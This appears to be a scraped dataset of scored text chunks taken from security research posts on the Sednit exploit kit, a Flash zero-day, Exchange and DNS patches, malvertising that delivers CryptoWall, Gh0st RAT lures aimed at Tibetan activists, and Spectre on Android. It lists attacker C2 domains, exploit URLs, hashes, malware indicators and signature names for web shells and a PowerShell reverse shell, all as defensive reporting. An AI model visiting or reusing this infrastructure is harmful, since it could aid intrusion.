As ever, Forcepoint Security Labs will continue to monitor for new developments and attacks in the wild.
",0.014796603664548824
"Sednit espionage group now using custom exploit kit
For at least five years the Sednit group has been relentlessly attacking various institutions, most notably in Eastern Europe. The group used several advanced pieces of malware for these targeted attacks, in particular the one we named Win32/Sednit, also known as Sofacy.",0.021101417662555133
8 Oct 2014 - 08:49AM,0.010576831910535933
"For at least five years the Sednit group has been relentlessly attacking various institutions, most notably in Eastern Europe. The group used several advanced pieces of malware for these targeted attacks, in particular the one we named Win32/Sednit, also known as Sofacy.",0.01965470844444317
"For at least five years the Sednit group has been relentlessly attacking various institutions, most notably in Eastern Europe. The group used several advanced pieces of malware for these targeted attacks, in particular the one we named Win32/Sednit, also known as Sofacy.",0.01965470844444317
"We recently came across cases of legitimate financial websites being redirected to a custom exploit kit. Based on our research and on some information provided by the Google Security Team, we were able to establish that it is used by the Sednit group. This is a new strategy for this group which has relied mostly on spear-phishing emails up until now.",0.016229113482723045
"In this blog, we will first examine on recent cases of spear-phishing emails using the CVE-2014-1761 Microsoft Word exploit. We will then focus on the exploit kit, which appears to still be in development and testing phase, and briefly describe the actual payload.",0.012425715818269345
From Spear-Phishing Emails…,0.012836710585094946
"Back in April 2014, the Win32/Sednit malware was being delivered through a 0-day vulnerability in Microsoft Word RTF documents, CVE-2014-1761. It was amongst a small number of malware families being delivered through this vulnerability, like BlackEnergy and MiniDuke, which are also used for targeted attacks.",0.011925447589549387
Here are two decoy documents showed to the victims while the vulnerability was silently exploited on their computer. Both of these documents present NATO views on the Ukrainian conflict.,0.013782001619363715
…to custom Exploit Kit,0.008299151466046095
"We observed redirections to the exploit kit from websites belonging to a large financial institution in Poland. The exploit kit is loaded through a simple IFRAME that is added near the end of the HTML document; for example hXXp://defenceiq.us/2rfKZL_BGwEQ in the screenshot below. We can also see a very similar looking IFRAME loading the URL hXXp://cntt.akcdndata.com/gpw?file=stat.js, whose domain name was registered on September 18th. We were not able to retrieve the content of this page but we suspect that its purpose is to collect statistics about the number of redirections.",0.010405296315215362
"When directly visiting the URL hXXp://defenceiq.us, we were redirected to defenceiq.com, a legitimate website that describes itself as “an authoritative news source for high quality and exclusive commentary and analysis on global defense and military-related topics”.",0.012407701409653638
"The domain defenceiq.us was found to resolve to 76.73.47.90. Other suspicious domains also resolved to this IP address and displayed the same redirection behavior when visited, which is a strong indication of the sectors the group is currently targeting. The redirection from Polish financial websites to a defense-related domain name seems less than optimal for a targeted attack and was probably due to the mixing of two ongoing campaigns.",0.013661891848284702
Exploit kit domainRedirects toWebsite content,0.010007448629480109
defenceiq.usdefenceiq.comMilitary news,0.010729429756435316
armypress.orgarmytime.comMilitary news,0.010679084707344244
mfapress.orgforeignaffairs.comForeign Affairs magazine,0.011178575328130602
mfapress.comforeignaffairs.comForeign Affairs magazine,0.012068489975220587
"caciltd.comcaci.comCACI International, defense & cyber security contractor",0.010640060832473486
"The exploit kit, which we named Sedkit as a reference to Sednit, behaves in a similar fashion to others commonly used today, such as the Angler or Nuclear exploit kits. A sample exploitation chain is shown below. The browser is first sent to the landing page which uses JavaScript to detect the browser and installed plugin versions.",0.012384504975403887
"Interestingly we can see that the call to DetectJavaForMSIE() is commented out. This follows the current trend in exploit kits of not targeting Java, because recent versions of Java and browsers warnings before loading applets. At the moment only Internet Explorer seems to be targeted: when we tested with Chrome and Firefox we were always redirected to localhost.",0.009475318222950557
"The browser then sends back the plugin information via a POST request. Based on this information, the exploit kit redirects the browser either to another URL containing an exploit, or to http://localhost. The kit only attempts one exploit per visit.",0.009473757746548461
"We recovered 3 different exploits used by the kit, all targeting Internet Explorer. They are listed below, with the specific version of IE each one targets. Interestingly, CVE-2014-1776 has not yet been seen in any popular exploit kits, and the other two have also seen only limited adoption.",0.01047832602297305
CVETargeted IE versionMicrosoft Security Bulletin,0.009416147804212294
CVE-2013-1347Internet Explorer 8MS13-038,0.010481894441893624
CVE-2013-3897Internet Explorer 8MS13-080,0.01109882457809186
CVE-2014-1776Internet Explorer 11MS14-021,0.01196742906595416
"However other aspects of the kit lack refinement. Unlike most contemporary exploit kits, it does not use JavaScript obfuscation. We even found comments in the JavaScript code related to the exploits’ ROP chains. This leads us to believe that the kit is still in its testing phase.",0.011837183618244151
Figure 1 From CVE-2013-3897 exploit code,0.0068105240498080866
Figure 2 From CVE-2014-1776 exploit code,0.0076761715304517475
"When uncompressing the Flash file used for the CVE-2014-1776, a path is visible. This information is not found in previous samples of this exploit in our collection.",0.007799572742124616
Upon successful exploitation the payload is downloaded; whether it is encrypted depends on the exploit.,0.011813975418305867
Payload,0.009121200219477266
"The binary deployed on the infected machine is named “runrun.exe”. Its sole purpose is to deploy a second program – initially encrypted and compressed — on the machine and ensure its persistence on the system. The second program is a Windows library named “splm.dll”. According to our data, this malware has been employed in targeted attacks since at least 2009.",0.00969181118070217
"Roughly summarized, this payload has been created with a C++ framework. Thanks to the Run-Time Type Information (RTTI), a part of the program architecture can be reconstructed with the names chosen by the programmer. The malware contains agent modules implementing malicious activities, and channels for communications between modules and remote controllers. In this sample, we found the following agent modules, identified by a 16-bit ID:",0.011135391559021324
Module NameIDPurpose,0.00887246051075996
AgentKernal0x0002Execution manager,0.007663788135899963
ModuleRemoteKeyLogger0x1002Keystroke logging,0.008863639806157675
ModuleFileSystem0x1102File system accesses,0.0069201495422142045
ProcessRetranslatorModule0x1302Provides communication means,0.009430425814320298
"It also instantiates one external communication channel named WinHttp, which decrypts three domain names used as command and control: msonlinelive.com, windows-updater.com and azureon-line.com.",0.009279988945745332
Conclusion,0.008171308922719556
"In recent years, exploit kits have become a major method employed to spread crimeware, malware intended for mass-scale distribution to facilitate financial fraud and abuse of computing resources for purposes such as sending spam, bitcoin mining, credentials harvesting etc.",0.01741961072711029
"Since 2012, we observed this strategy being used for espionage purposes in what has become known as “watering-hole attacks” or “strategic web compromises”. A Watering-hole attack can be described is redirecting traffic from websites likely to be visited by members of a specific organization or industry being targeted. In ESET’s retrospective on Windows exploitation in 2013, Artem Baranov wrote “the past year can rightly be called the year of targeted attacks and watering hole attacks”.",0.012304338011583371
"While many instances of watering-hole attacks have been documented for related actors in cases such as noted by Symantec in their Elderwood Project report, we are now seeing this strategy being adopted by another group and it seems likely that others will follow them.",0.015034957239397628
Indicators of compromise,0.007397983315839851
Here are some indicators that could help to identify the payload sample dropped by the exploit kit described in this blog post:,0.00834006178634572
"Presence of the CLSID {d702b440-b130-47f7-a94c-c1fae33d2820} under the registry key HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
Mutex named “XSQWERSystemCriticalSection_for_1232321”
Mailslot named “\\.\mailslot\check_mes_v5555”
Files in temporary folder (as returned by GetTempPath()) named “edg6EF885E2.tmp” and “edg6E85F98675.tmp”
Network communications with the domains named msonlinelive.com, windows-updater.com, or azureon-line.com",0.009671232414919073
Hashes,0.008943721272284266
SHA-1RoleDetection name,0.01062801417785364
86092636E7FFA22481CA89AC1B023C32C56B24CFWord exploitWin32/Exploit.CVE-2014-1761.D,0.007676208521080419
12223F098BA3088379EC1DC59440C662752DDABDWord exploitWin32/Exploit.CVE-2014-1761.D,0.008724677052423524
D61EE0B0D4ED95F3300735C81740A21B8BEEF337DropperWin32/Agent.WLF,0.007656608538801679
"D0DB619A7A160949528D46D20FC0151BF9775C32PayloadWin32/Agent.WLF
",0.007915880670241404
"Save your work! Microsoft Releases Critical Security Patch
As expected, Microsoft has released a critical out-of-band patch for the LNK shortcut file vulnerability which received attention last month. As a critical patch, this update will be delivered through Windows’ Automatic Update service, as well as being directly available for download from Microsoft’s site without a Windows Genuine Advantage check. A reboot is required for the",0.010914336540549074
2 Aug 2010 - 11:57AM,0.011182272934971094
"As expected, Microsoft has released a critical out-of-band patch for the LNK shortcut file vulnerability which received attention last month. As a critical patch, this update will be delivered through Windows’ Automatic Update service, as well as being directly available for download from Microsoft’s site without a Windows Genuine Advantage check. A reboot is required for the",0.010072363089065006
"As expected, Microsoft has released a critical out-of-band patch for the LNK shortcut file vulnerability which received attention last month. As a critical patch, this update will be delivered through Windows’ Automatic Update service, as well as being directly available for download from Microsoft’s site without a Windows Genuine Advantage check. A reboot is required for the patch to take effect.",0.009776640475029907
"Windows users can download and install the patch themselves, or allow Microsoft to apply it to their computer overnight using the Automatic Update service. If you choose the latter, be sure to save any open work on your computer before leaving the computer for the evening. Otherwise, you may find a freshly booted system when go to your PC the following morning.",0.011935748957310977
"Information about the vulnerability, along with the patch, can be found in the following Microsoft Security Bulletin:",0.008544036014861756
Microsoft Security Bulletin MS10-046 – Critical Vulnerability in Windows Shell Could Allow Remote Code Execution (2286198),0.015290717524663267
"Here is a list of all articles we have written about CVE-2010-2568 (the Common Vulnerability and Exposure number assigned to the threat) in the blog, as well as malware using it as a vector, such as Win32/Stuxnet.",0.010555306362544647
Date,0.010601038756765435
Article,0.010318899588746322
July 27,0.008834890657583916
"More LNK exploiting malware, by Jove!*",0.007577907481624346
July 23,0.008536594461665215
Link Exploits and the Search for a Better Explorer,0.006632177603406508
July 22,0.00886052777787183
A few facts about Win32/Stuxnet & CVE-2010-2568,0.009413704025232117
July 22,0.00886052777787183
New malicious LNKs: here we go…,0.009541704136067919
July 22,0.00886052777787183
Why Steal Digital Certificates?,0.016798278993467752
July 22,0.00886052777787183
Win32/Stuxnet: more news and resources,0.007550552843919256
July 20,0.00863060493245782
There’s Passwording and there’s Security,0.01092174595841855
July 19,0.008626854961128916
It Wasn’t an Army,0.010107890674864284
July 19,0.008626854961128916
Win32/Stuxnet Signed Binaries,0.010124551115573754
July 19,0.008626854961128916
Yet more on Win32/Stuxnet,0.008929626830236459
July 19,0.008626854961128916
"(Windows) Shellshocked, Or Why Win32/Stuxnet Sux…",0.012030339532917766
"We recommend that people begin deploying the patch as soon as possible. While ESET’s software protects against the malware currently known to exploit this vulnerability, installing Microsoft’s patch closes the vulnerability on the operating system.",0.011252135332003421
"Regards,",0.012387476413151632
"Aryeh Goretsky, MVP, ZCSE
Distinguished Researcher
",0.009562063253802378
"New Adobe Flash Zero-Day found in the Wild
Security researcher Kafeine has discovered a Zero-Day in Adobe Flash Player distributed through the Angler Exploit Kit. An Oday is an exploit for a vulnerability that has not been patched yet, meaning that even the most up-to-date systems could get infected.
[Edit: the vulnerability has now been assigned CVE-2015-0311]
Flash has been plagued with critical vulnerabilities in the past few months and surpassed the no longer popular Java as the most exploited plugin.
We immediately got our hands on this new Zero-Day (thanks Kafeine) and were able to replay it as well with the goal of testing our Anti-Exploit product:",0.010374882799440321
"With the latest version of Internet Explorer (IE11) and latest version of Flash (16.0.0.257), the exploit was successfully blocked by Malwarebytes Anti-Exploit.
On unprotected machines, the Angler Exploit Kit will install Bedep, a distribution botnet that can load multiple payloads on the infected host.
As this is a breaking story, we are still analyzing the exploit and will update this post later accordingly.
Update: 01/21/15: Some details about the malware payload.
The payload in this particular instance was ad fraud. Upon infection, explorer.exe (not to be confused with iexplore.exe) is injected and performs the ad fraud calls.
The following Fiddler capture shows how a zombie PC is gaming the ad networks with bogus requests without the victim’s knowledge:",0.010417387871602068
"Unfortunately it is very hard to tell apart real users from fake ones and advertisers essentially end up paying for “impressions” or “clicks” where a human being was never involved.
Update(2): 01/21/15: Firefox or Win 8.1 vulnerable with Flash Player vulnerability. See: here and here.
Update(3): 01/21/15: Microsoft releases FixIt for Windows 8 and 8.1 as well as Windows Server 2012.
Update(4): 01/22/15: Adobe releases a patch for CVE-2015-0310 which is a different vulnerability than the one mentioned here.
Update(4): 01/23/15: Malvertising campaign rides on Flash Zero-Day wave
We are tracking an ongoing campaign that is taking advantage of the latest Flash vulnerability. Major websites are unwillingly participating in the distribution of the Bedep Trojan via malicious ads propagated via various advertisers:",0.010876157816407828
"clkrev.com
ptrk-wn.com
clkoffers.com
affyieldmb.com
zeroredirect1.com
zb.zeroredirect2.com
onclickads.net",0.013255848067453058
"The campaign can be identified by rotating referers using the .eu TLD which redirect to Angler EK landing pages (.in TLD).
In some instances users get redirected to fake warning pages (tech support scams):",0.018290687106705894
"We will keep monitoring this campaign as it evolves.
Update(5): 01/24/15: Adobe releases patch for 0day
Adobe has released an update to the Flash Player to fix CVE-2015-0311. As always make sure you are downloading this update (version 16.0.0.287) ASAP, from the official site.
@jeromesegura
",0.01017948698558091
"Critical updates dominate March, 2021 Patch Tuesday releases",0.011632770441687534
"Fixes urgently required for DNS and Exchange servers, as well as for all desktop Windows machines",0.009890150859737656
"Written by
Andrew Brandt,",0.009161029206781302
SophosLabs Offensive Security,0.008990065059669039
"March 09, 2021",0.00948548218048062
SophosLabs Uncut Threat Research 2021-03 DirectX DNS Server Exchange Exchange Server Hafnium HEVC Internet Explorer Patch Tuesday Web shells webshell win32k Windows Update,0.007971413260980054
"After several months of monthly updates that fix fewer-than-average bugs in Windows and other Microsoft products, the March edition of Patch Tuesday once again repairs a raft of urgently-needed fixes affecting both enterprise services and software common to most Windows desktop installations. Microsoft also published a series of fixes ahead of the normal release schedule to address critical vulnerabilities that have been actively exploited against Exchange, the mail server software widely used by large organizations and hosted both in cloud services and in on-premises installations.
This month’s updates will also address several serious problems that have been discovered in Microsoft’s DNS Server software. In the analysis guidance provided by Microsoft, these vulnerabilities not only pose a risk of remote code execution but could lead to so-called wormable exploits targeting DNS servers en masse. Another important bug addressed this month is a remote code execution vulnerability currently being exploited against Internet Explorer. And Microsoft has fixed a critical RCE bug affecting Git for Windows, which is now included by default with Microsoft’s Visual Studio development tools. In all, 89 distinct vulnerabilities will be closed down by this update, 14 of which the company classifies as critical.
As with all Patch Tuesdays, Microsoft publishes detailed analysis about major fixes on their Security Updates page. The availability of patches does not mean that your computer will install it quickly, enough. To find and download this month’s Cumulative Update patch yourself, search for the term “2021-03” at the Microsoft Update Catalog website and select the monthly security rollup that matches your computer’s CPU architecture and build of Windows. You can also read the full technical details about each patch on March‘s Security Updates Guide.
What follows are notes about some of the more critically important fixes released this month.
Multiple critical vulnerabilities affecting Microsoft Exchange
CVE-2021-26412, -26854, -26855, -26857, -26858, -27065, and -27078
Out-of-band patches for bugs Microsoft was planning to fix, anyway, in an upcoming release cycle are thankfully rare, but they’re also an indication of a serious problem that demands immediate action. Unfortunately, in the case of some of the Exchange vulnerabilities fixed this month, there was the combination of a novel bug, actively being abused by a nation-state threat actor, that could reveal the contents of someone’s email inbox. Microsoft designated the attackers with the pseudonym Hafnium and published a detailed disclosure about the bug and the threat actors who were using it in active attacks.
The bugs affect the 2013, 2016, and 2019 versions of Microsoft Exchange server. At least one of the bugs is capable of dependably being used to create a remote system shell on the affected server versions, while another can be used to elevate the privileges of the Exchange server process, so it can be used to launch elevated-permissions payloads.
While many of the administrators who manage Exchange servers may already have installed the out-of-band patch, the inclusion of this fix in Windows Update will help to deliver updates to Exchange servers operated by less vigilant administrators.
There are specialized detections that have been deployed to the IPS built into Sophos firewall products, as well as to both legacy and advanced Sophos endpoint tools. See the detection guidance section, below, for details.
Remote code execution & DoS bugs in DNS Server
CVE-2021-26877, -26893, -26894, -26895, -26896, and -27063
Because services that face the public internet are more readily accessible to potential attackers, bugs affecting those services tend to rapidly be targeted for exploitation. DNS servers are a very visible, highly accessible service that would be ripe for just such an attack. Microsoft fixed eight bugs (including one classified as critical) that would permit an attacker to run hostile code on the machine hosting a DNS server, or render the DNS server unavailable to its users, either of which could result in widespread problems in the network segment where those servers are hosted.
Privilege escalation bugs in win32k driver and DirectX
CVE-2021-26863, -26875, -26900, -27077 (win32k); CVE-2021-24095 (DirectX)
Both the win32k and DirectX components of Windows are responsible for displaying data on-screen, both in the operating system and for applications like games. This month, Microsoft released fixes for these components that, if not addressed, an attacker might leverage during an attack to give themselves software execution privileges beyond those of whatever user account level they might be using at the time. Microsoft, notably, provided very specific guidance about one of the win32k bugs, a remote code execution vulnerability (CVE-2021-26863) that involves a race condition on the driver.
In the words of the Offensive Research team member who read up on the Microsoft documentation of this win32k bug, “it was one of the most complete writeups I’ve ever seen come out of [the MAPP program], and included details about how they found the exploit and what did and didn’t work. The technique [Microsoft] came up with to win the race can be applied to many other bugs.”
Internet Explorer bugs
CVE-2021-26411, -27085
The latter of these two bugs affecting the aging Internet Explorer browser is by far the more serious, a remote code execution vulnerability that Microsoft has spotted being used in the wild by attackers. The bug affects IE’s mshtml module, the parsing engine used by the browser. Microsoft’s guidance included a proof-of-concept that demonstrated the exploits functionality on IE running under 32-bit Windows 10.
Sophos protection
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.
IPS Signatures to detect Exchange server attacks with XF/SFOS",0.014104054720703307
"CVE
SID",0.008611871716647679
"CVE-2021-26855
57241, 57242, 57243, 57244, 2305106, 2305107",0.012400034692841677
"CVE-2021-26857
57233, 57234",0.009072569399901198
"CVE-2021-26858
57245, 57246",0.008971200790309553
"CVE-2021-27065
57245, 57246",0.009087677112076586
"Anti-Malware signatures for CIXA and legacy SAV
The following AV signature names could be monitored by the customers to recognize potential Hafnium attacks.
Webshell related",0.010373018499987618
"Troj/WebShel-L
Troj/WebShel-M
Troj/WebShel-N
Troj/ASPDoor-T
Troj/ASPDoor-U
Troj/ASPDoor-V
Troj/AspScChk-A",0.01627856100215852
Other payloads,0.0083880751660097
"Troj/Bckdr-RXD
ATK/Pivot-B
AMSI/PowerCat-A  (Powercat)
AMSI/PSRev-A (Invoke-PowerShellTcpOneLine reverse shell)",0.011808115286593757
"Due to the dynamic nature of the webshells, Sophos will not perform automatic cleanup; The product blocks the shells, but removal requires manual effort. We have also blocked relevant C2 IP destinations, where it was safe to do so.
In addition to SophosLabs protection, Intercept X’s CredGuard feature will prevent the “lsass dump” stages of Hafnium-like attacks against Exchange servers from working.",0.0091548217427726
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
VLC Media Player Update,0.0082010115832728
"Posted by Roger on 28 February 2008, 8:27 pm",0.012976844375367724
"VLC Media Player 0.8.6e is available to release multiple security vulnerabilities.
Security Advisory 0801
Summary : Format string vulnerability in the Web interface
Stack-based buffer overflow in the Subtitles demuxer
String buffer overflows in the Real RTSP demuxer
CVE references : CVE-2007-6681, CVE-2007-6682, CVE-2008-0295, CVE-2008-0296
Security Advisory 0802
Summary : Arbitrary memory overwrite in the MP4 demuxer
CVE reference : CVE-2008-0984
Security Advisory 0803
Summary : Arbitrary file overwrite and other abuses
through M3U parser and browsers plugins
CVE reference :
I’ve seen VLC showing up in the vulnerability scans more at work. People install it because it supports a wide variety of multimedia formats. One more non-standard app to get patched.
",0.007697529703607375
"Popcash Malvertising Leads to CryptoWall
The online advertising industry is a very lucrative business and so it comes as no big surprise that cyber-criminals have taken a keen interest on how to ‘milk’ it using different fraudulent techniques.
One particular technique known as malvertising, leverages the infrastructure provided by ad networks to distribute malicious content to end users while they browse the Internet.
Today we are looking at a prolific ad network (over 180M hits/month according to SimilarWeb) being used by online fraudsters to distribute malware and other nuisances. Popcash is a pop-under ad network that offers services for both publishers and advertisers.",0.01656789215019061
"Pop-under ads are similar to pop-up ads, but the ad window appears hidden behind the main browser window rather than superimposed in front of it. As pop-up ads became widespread and took up whole computer screens, many users learned to immediately close the popup ads that appeared over a site without looking at them. Pop-under ads do not immediately impede a user’s ability to view the site content. They usually remain unnoticed until the main browser window is closed or minimized, leaving the user’s attention free for the advertisement. Research has indicated that users therefore react better to pop-under advertising than to pop-up advertising because of this different, delayed “impression”. —Wikipedia
Malvertising analysis
First, let’s do a quick analysis of the malvertising case we have on our hands.
Loading the following ad URLs, is a little bit like spinning the wheel of a gun in that you take a chance with your computer’s security.
http://popcash.net/world/go/49931/92055/
http://popcash.net/world/sgo/49931/92055/367b01ac31fe6ea1/
In this case, we received a URL used as a gate to an exploit kit:",0.016069121752540272
"Magnitude exploit kit
The Magnitude EK starts with a simplified landing page that contains the code to launch a Flash exploit and an iframe to perform an Internet Explorer exploit:",0.008699880848620611
The Flash exploit (VT) is CVE-2015-3090 (thanks @TimoHirvonen).,0.013315440892144648
The Internet Explorer exploit is prepared via a heavily encoded piece of JavaScript:,0.006473275921285437
Shellcode is used to deliver the binary payload(s) via urlmon.dll:,0.009413617212442604
"Several URLs are loaded but only a couple actually loaded the same binary (VT) detected by Malwarebytes Anti-Malware as Trojan.Dropper.Necurs, which eventually loads CryptoWall 3.0.
However, other slots are available and could be filled with different malware families by the exploit kit operator.
Malwarebytes Anti-Exploit users were protected from this attack:",0.010160738453120488
Fiddler summary:,0.009133321425332963
"CryptoWall 3.0
Magnitude EK, just like many other exploit kits recently, is pushing crypto ransomware, possibly one of the worst strains of malware because it uses genuine encryption to lock down a user’s personal files.
Soon after the ransomware takes over the PC, it will prompt a message warning of what just happened and giving details on how to proceed.",0.01146918734287905
"In this case, one needs to pay $500 to get their files back within the deadline, otherwise that amounts doubles:",0.016975771119965066
"Paying the ransom as a desperate measure to get those important files can be understood but it also keeps this underground economy flourishing.
Conclusions
Because malvertising involves multiple players in order to work (publishers, ad networks, visitors) each has its own role to play in combatting this problem.
Publishers can be wise in choosing their third-party advertisers by choosing reputable ones (although it is not a 100% guarantee (nothing is) that incidents will not happen).
Ad networks can and should also ensure that the traffic they serve is clean. We contacted Popca$h on two separate occasions through their official “report malware” page, but never received a response.
The campaign is still ongoing and not only serving exploits but also tech support scams customized for your browser, ISP, city, etc:",0.012707511584081121
"Visitors can dramatically reduce the risks by keeping their computers up to date and ensuring that they have anti-exploit and anti-malware installed. As we have seen recently, this can even act as a deterrent.
Update: 06/15: Popcash sent us an email acknowledging the problem and saying the malvertisement has been blocked.
",0.010375370364999803
"G20 2014 Summit Lure used to target Tibetan activists
APT actors trying to use big events as a lure to compromise their targets is nothing new. Tibetan NGOs being targeted by APT actors is also nothing new. Thus, surrounding the upcoming G20 2014 summit that is held in Brisbane, Australia, we were expecting to see G20 themed threats targeted at Tibetan NGOs. A Win32/Farfli (alias Gh0st RAT) sample ultimately confirmed our suspicions.",0.01889219477190196
14 Nov 2014 - 03:29PM,0.010821820066313936
"APT actors trying to use big events as a lure to compromise their targets is nothing new. Tibetan NGOs being targeted by APT actors is also nothing new. Thus, surrounding the upcoming G20 2014 summit that is held in Brisbane, Australia, we were expecting to see G20 themed threats targeted at Tibetan NGOs. A Win32/Farfli (alias Gh0st RAT) sample ultimately confirmed our suspicions.",0.016336214114363368
"APT actors trying to use big events as a lure to compromise their targets is nothing new. Tibetan NGOs being targeted by APT actors is also nothing new. Thus, surrounding the upcoming G20 2014 summit that is held in Brisbane, Australia, we were expecting to see G20 themed threats targeted at Tibetan NGOs. A Win32/Farfli (alias Gh0st RAT) sample ultimately confirmed our suspicions.",0.016336214114363368
"Gh0st RAT is an off-the-shelf RAT that is used by a variety of threat actors. It has been used in the past in numerous targeted campaigns as well as crimeware-like operations. The sample we were looking at had a very low number of detections amongst our users: only two hits in China. After a quick dynamic analysis, we saw that the magic word used in network communications by this sample is “LURK0”, instead of the infamous “Gh0st”. This particular magic word has been used against Tibetan groups in the past.",0.010999155498978563
"Digging a bit deeper, we were able to recover an email that delivered this threat on VirusTotal.",0.012147928795987806
"This is a pretty classic case of spear phishing email. The malicious actor is trying to lure the user into opening the infected attachment by using a rally that is organized by the Australian Tibet Council. In fact, the email text was taken directly off their website. This email was allegedly sent to the European Central Tibetan Administration.",0.013468055277616742
"After analysis, the word document, entitled “A_Solution_for_Tibet.doc”, is exploiting CVE-2012-0158, a very old exploit that is still reliably used by malicious actors to compromise systems around the world. If the document is opened, it will try to install Gh0st RAT in the following folder (on a Microsoft Windows XP system): C:\Documents and Settings\Administrator\Application Data\Micbt.",0.010865178449221413
"Once installed, the RAT will try to connect to the following two domains:",0.009520652904462579
"mailindia.imbss.in
godson355.vicp.cc",0.010349046105438742
"Interestingly, the second domain has been seen in targeted attacks before.",0.019188869443961143
"While we do not have enough information to make any serious attribution, this attack has several elements that are usually seen in targeted attacks. As these attacks are nowadays very common, a few words of caution are in order. It is important to remember to avoid opening email attachments sent by unknown senders and to keep software installed on its computer up-to-date. NGOs Members with a political, religious or environmental agenda have been targeted in the past and will most likely continue to undergo continuous attacks in the future. In the light of constant attacks against them, they should definitely be as cautious as one can be when these types of emails are received, especially when popular themes or news events are used as a lure.",0.015066778630357325
Indicators of Compromise (IOCs),0.019393949867491322
Email,0.009317642269235038
"Sender: Tibet Press <tibet.press@aol.com>
Subject: Join us at a rally for Tibet during the G20 Summit",0.015312339364954242
Word Document,0.009210106949592123
"Name: A_Solution_for_Tibet.doc
SHA1: b16900da71052b4acf4afb8b1b230d500c99460a",0.009553455344958328
Win32/Farfli,0.007885380725360713
"Dropped in C:\Documents and Settings\Administrator\Application Data\Micbt on Microsoft Windows XP Systems
Fiel name: RasTls.exe
SHA1: 4ead7c11f81b101555b27a14e00ecdf7baa7d42f
Domains contacted:",0.010378877505631379
"mailindia.imbss.in
godson355.vicp.cc",0.010349046105438742
"Picture Credits: ©McKay Savage/Flickr
",0.009028235482038016
Does malware based on Spectre exist?,0.01588183734659221
Axelle Apvrille,0.008500718013609188
"Fortinet, France",0.00884976040262131
Copyright © 2018 Virus Bulletin,0.009633121006031975
"Table of contents
Introduction Part 1: Is your Android smartphone vulnerable? Is ARM Cortex A53 vulnerable? Testing a proof of concept AArch64 PoC does not work Challenges for an ARMv7 PoC Timing results Part 2: Is there any Spectre-related malware in the wild? Spectre malware samples? Detecting Spectre malware Conclusion Acknowledgements References",0.02177144383025431
Introduction,0.012036720276026314
"The Spectre attack [1] has received massive coverage since the beginning of 2018, and by now, it is likely that everyone in computer science has at least heard about it. Spectre exploits the fact that speculative execution resulting from a branch misprediction may reveal private data to an attacker. Excellent explanations of the attack already exist, ranging from simple and short [2] to technical and detailed [1, 3].",0.01802426944599078
"Rather than being 'yet another paper' that explains Spectre, this one will focus on the probability of finding Spectre being exploited on Android smartphones. More precisely, we will answer two questions:",0.021267303395981707
"Is your
Android
smartphone vulnerable to Spectre? (ARM has published a security advisory with a list of vulnerable processors, but we will see that the answer is not just a simple matter of checking the list.)",0.01900661238959378
"How can we detect malware that uses Spectre, and does any exist?",0.012417490755756488
Part 1: Is your Android smartphone vulnerable?,0.013915404157047062
"As ARM processors are currently predominant on Android smartphones, and as Spectre on Intel x86 has largely been covered already, this article focuses on Android smartphones with ARM processors.",0.016002093267243667
"The ARM Cortex A53 [4] is a particularly nice pick for this study, because it is used in popular systems on chip (SoCs) (e.g. Qualcomm Snapdragon 410, 610, 615) and is therefore found on many smartphones, especially low-to-middle range ones. A quick survey among work colleagues confirms this distribution, as shown in Figure 1.",0.01735164051743654
Figure 1: Distribution of ARM processors on Android smartphones in a department of Fortinet in January 2018.,0.017978840723668954
We will therefore use the ARM Cortex A53 as an example and try to determine whether Android smartphones using this processor are vulnerable to Spectre.,0.018007718314007715
Is ARM Cortex A53 vulnerable?,0.015552043398151638
ARM has published a security advisory [5] in which it conveniently lists which processors are vulnerable to Meltdown and Spectre. The report explicitly states that processors that are not listed are not affected.,0.0240037722327896
"Good news! ARM Cortex A53 is not listed in the security advisory, which, according to the report, means it is not vulnerable. The document doesn't explain why, though, and it is quite perplexing because the specifications [6] of the processor rather indicate that it would be vulnerable. Indeed, we find in the specifications references to flags showing that there is speculative execution, including speculative execution of indirect branches, which is pertinent to Spectre versions 1 and 2. So is it vulnerable, or not? Without further explanation, the best solution is to test it.",0.013798223846618662
Testing a proof of concept,0.008742581171789165
"In order to test in practice on an Android smartphone with an ARM Cortex A53, we need a proof of concept. At this stage, it is important to highlight that proofs of concept (PoCs) are not malware. Rather, they should be seen as demos that are used to show the feasibility of a given concept.",0.011906298753664557
There are basically three types of PoC for Spectre:,0.009749843282001791
PoCs for x86 – copied or derived from the official paper,0.009617149063060548
Ports to other platforms,0.0077418973358892584
"PoCs for more recent versions of Spectre, also known as Spectre-NG.",0.01566394366528545
"None of these PoCs carry any malicious payload, and in fact, turning them into malware would involve a significant amount of work (e.g. communication between processes, shared memory, etc.).",0.01318158174007733
AArch64 PoC does not work,0.009732816613431283
"One PoC in particular is interesting for this study: there is a port for Android AArch64 [7]. The ARM Cortex A53 is an ARMv8-A processor which supports 64-bit executables, with backward compatibility to ARMv7-A for 32-bit executables. So, the PoC should be suitable.",0.011303451339753745
"We cross-compile the PoC for our smartphone, push it on the device, and run:",0.008805259658303588
"git clone https://github.com/V-E-O/PoC/tree/master/CVE-2017-5753
NDK_DIR/build/tools/make_standalone_toolchain.py --arch arm64 --api SDK_NUMBER --installdir TOOLCHAIN_DIR
TOOLCHAIN_DIR/bin/aarch64-linux-android-gcc source.c -o spectre
adb push spectre /data/local/tmp
adb shell chmod u+x /data/local/tmp/spectre
adb shell /data/local/tmp/spectre
/system/bin/sh: ./spectre: not executable: 64-bit ELF file",0.011749223576086432
"The smartphone refuses to execute the PoC, complaining it cannot handle 64-bit executables. Indeed, when we check the CPU information on the smartphone, we do not see the expected ARMv8 model, but ARMv7.",0.009950262831383228
"[email protected]
:/ $ cat /proc/cpuinfo
processor : 0
model name : ARMv7 Processor rev 0 (v7l)
BogoMIPS : 38.00
Features : swp half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 evtstrm
CPU implementer : 0x41
CPU architecture : 7
CPU variant : 0x0
CPU part : 0xd03
CPU revision : 0",0.015406006542444173
"This is quite common: it means we have a 64-bit capable processor, but we have a 32-bit stock kernel. So, there is no way this PoC will run on our smartphone – we need a 32-bit PoC for ARMv7.",0.012058583085372776
Challenges for an ARMv7 PoC,0.010792904590217645
"Unfortunately, there is no PoC for ARMv7, so we decided to port it. The port is not an easy one, because some x86 instructions are missing in ARMv7. The official Spectre PoC implements a Flush+Reload cache attack, so we need (1) an instruction to flush the cache, and (2) an instruction to time access to memory accurately.",0.01384934874999888
